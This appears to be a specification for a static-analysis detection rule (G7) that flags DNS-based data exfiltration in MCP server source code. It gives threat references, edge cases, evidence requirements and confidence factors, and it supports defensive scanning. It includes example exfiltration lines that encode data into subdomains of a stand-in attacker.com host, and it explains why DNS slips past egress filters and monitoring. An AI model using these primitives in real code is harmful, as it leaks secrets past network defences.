---
rule_id: G7
interface_version: v2
severity: critical

threat_refs:
  - kind: paper
    id: Embrace-The-Red-DNS-Exfil-2024
    url: https://embracethered.com/blog/posts/2024/
    summary: >
      Johann Rehberger (Embrace The Red) — demonstrated DNS-based
      data exfiltration against LLM-integrated tooling in 2024. Data
      is encoded as a subdomain label in a DNS query; the attacker
      runs the authoritative nameserver and harvests the data from
      query logs. Traverses HTTP egress filters because UDP/53 is
      rarely blocked. Canonical real-world precedent for G7.
  - kind: paper
    id: MITRE-ATTACK-T1071.004
    url: https://attack.mitre.org/techniques/T1071/004/
    summary: >
      MITRE ATT&CK T1071.004 — Application Layer Protocol: DNS. The
      technique documents DNS as a command-and-control and data-
      exfiltration channel used by APT34 (OilRig), FIN7, and
      commodity malware. G7 detects the static primitive the
      technique relies on: a DNS resolution call whose hostname is
      constructed dynamically from application data.
  - kind: spec
    id: MITRE-ATLAS-AML.T0057
    url: https://atlas.mitre.org/techniques/AML.T0057
    summary: >
      MITRE ATLAS AML.T0057 — LLM Data Leakage. The DNS channel is
      one of the exfiltration primitives by which an LLM-integrated
      agent's context or credentials can be smuggled out of the
      trust boundary. G7 is the static detection for this primitive.
  - kind: spec
    id: OWASP-MCP04-data-exfiltration
    url: https://genai.owasp.org/llm-top-10/
    summary: >
      OWASP MCP Top 10 category MCP04 — Data Exfiltration. DNS
      exfiltration is the canonical firewall-bypassing exfil channel
      the category exists to cover. G7 is the source-code detection;
      F1 / F7 are the cross-tool detection.
  - kind: paper
    id: CWE-200-sensitive-information-exposure
    url: https://cwe.mitre.org/data/definitions/200.html
    summary: >
      CWE-200 — Exposure of Sensitive Information to an Unauthorized
      Actor. A DNS query whose hostname encodes sensitive data
      exposes it to the authoritative nameserver operator and every
      recursive resolver on the path. Direct CWE match for G7
      findings.

lethal_edge_cases:
  - >
    Base32-encoded subdomain chunks — DNS label limit is 63 bytes so
    the attacker chunks the data into base32 segments across multiple
    queries: `dns.resolve(\`\${chunk1}.\${chunk2}.attacker.com\`)`.
    Each chunk is a separate template-literal interpolation. The rule
    fires on ANY dynamic hostname in a dns.* call, regardless of
    chunking strategy.
  - >
    DNS-over-HTTPS exfil — `fetch("https://dns.attacker.com/dns-query?name=" + chunk)`.
    The sink is fetch, not dns.resolve, but the URL contains dynamic
    data against a DoH endpoint. G7 co-fires with L9 (HTTP exfil) in
    this case; the dns-query / doh / mozilla.cloudflare-dns markers
    elevate the L9 finding with a G7 companion.
  - >
    Recursive DNS amplification — the query target looks like a
    legitimate resolver (1.1.1.1 / 8.8.8.8) but the QNAME carries the
    attacker's subdomain. The rule does not filter by target IP; any
    dns.* call with a dynamic QNAME fires.
  - >
    MX / TXT / SRV record exfil — `dns.resolveTxt(\`\${data}.attacker.com\`)`.
    Record-type is irrelevant to the channel. The rule matches on
    dns.resolve / dns.resolve4 / dns.resolve6 / dns.resolveTxt /
    dns.lookup — not the record type.
  - >
    Indirect via a helper — `const qname = build(secret); resolveDns(qname)`
    where `resolveDns` is a project-local wrapper. The wrapper is
    matched by name when it contains "dns" / "resolve" / "lookup" in
    the identifier; the rule extends the sink set structurally rather
    than relying on library names alone.

edge_case_strategies:
  - base32-chunked-subdomain          # fire on any template-literal hostname regardless of chunking
  - doh-fetch-cofire                   # DoH URLs fire L9 + G7 marker
  - recursive-dns-amplification        # target IP does not suppress the finding
  - record-type-agnostic               # MX / TXT / SRV all count
  - wrapper-by-name-heuristic          # project-local resolveDns() wrapper still fires
  - entropy-as-confidence-factor       # Shannon entropy of the dynamic subdomain is a confidence input
  - ast-taint-from-secret-source       # env / file-content / user-parameter source types

evidence_contract:
  minimum_chain:
    source: true
    propagation: true
    sink: true
    mitigation: true
    impact: true
  required_factors:
    - dynamic_hostname_construction
    - subdomain_entropy_score
    - unmitigated_egress_reachability
  location_kinds:
    - source

obsolescence:
  retire_when: >
    The MCP runtime / sandbox spec mandates that every server's DNS
    resolution goes through a sidecar allowlist (like Cloudflare
    1.1.1.1 Families' category filter but enforced at the MCP
    sandbox boundary), such that dynamic hostnames simply do not
    resolve. At that point the source-code primitive becomes
    unexploitable and G7 becomes redundant coverage of F1/F7.
---

# G7 — DNS-Based Data Exfiltration Channel

**Author:** Senior MCP Threat Researcher persona (adversarial, LLM-attack specialist).
**Applies to:** MCP servers whose source code is scanned by Sentinel.
The rule looks for DNS resolution calls whose hostname is constructed
dynamically — from a template literal with interpolation, from a
string concatenation with a runtime variable, or from a reference to
a tainted identifier.

## Why DNS exfiltration is different

DNS-based exfiltration bypasses the defences the MCP deployment
environment typically layers on top:

- HTTP egress filters don't inspect UDP/53.
- DLP systems don't parse DNS query content.
- SIEMs don't alert on individual DNS queries (volume is too high).
- Network segmentation lets DNS recurse across zone boundaries.
- Air-gapped networks still allow DNS recursion through a resolver.

A server with a dynamic-hostname DNS call is therefore a
pre-positioned data-theft primitive that none of the runtime
controls the operator is likely to have deployed will catch.

## What an auditor accepts as evidence

A MCP04 / CWE-200 auditor requires:

1. **Source** — a `source`-kind Location on the AST node where the
   data that becomes the subdomain enters the hostname construction.
   Categories: `environment` (env var), `user-parameter` (tool
   argument), `file-content` (file read), `database-content`
   (DB row).

2. **Propagation** — one link per AST hop. Direct use is zero hops
   (`dns.resolve(\`\${secret}.attacker.com\`)`); multi-hop is a
   build() / encode() helper chain.

3. **Sink** — a `source`-kind Location on the DNS resolution call —
   `dns.resolve` / `dns.resolve4` / `dns.resolve6` / `dns.resolveTxt`
   / `dns.lookup`, Python `socket.gethostbyname` / `dns.resolver.resolve`,
   OR a project-local wrapper function whose name contains `dns` /
   `resolve` / `lookup`. `sink_type = "network-send"`,
   `cve_precedent = "T1071.004"`.

4. **Mitigation** — present when a hostname allowlist / egress
   sanitiser (`isAllowedHost`, `validateHostname`, URL allowlist check)
   is observed in the enclosing function. The `charter-audited`
   sanitiser set (data/config.ts) is deliberately small.

5. **Impact** — `data-exfiltration`, scope `connected-services`,
   exploitability `trivial` on direct use, `moderate` on multi-hop.

6. **Verification steps** — open the sink, read the hostname
   construction, trace backward to the source, inspect any allowlist,
   check CI / deployment DNS egress policy.

## Confidence factors

- `dynamic_hostname_construction` — fires in every G7 finding. The
  core signal.
- `subdomain_entropy_score` — Shannon entropy of the dynamic
  portion. If the analyzer can estimate entropy from an
  identifier-chain rationale (e.g. the expression references a
  Buffer.from(...).toString("hex") chain), the factor rewards
  high entropy. If entropy cannot be estimated statically, the
  factor is logged with adjustment 0 for traceability.
- `unmitigated_egress_reachability` — 0.08 when no allowlist,
  −0.2 when a charter-known allowlist is on the path.

## Why confidence is capped at 0.88

The source-code pattern is strong, but:

- Some legitimate use cases exist: service discovery over DNS SRV,
  CNAME flattening, custom DNS-based health checks. A reviewer must
  rule these out.
- Egress-level DNS allowlists (Unbound block lists, Cloudflare
  Gateway policies, corporate DNS proxies) can neutralise the
  channel at runtime; the static analyser cannot see them.
- Entropy estimation is structural — the rule cannot compute
  runtime entropy of the actual data that flows.
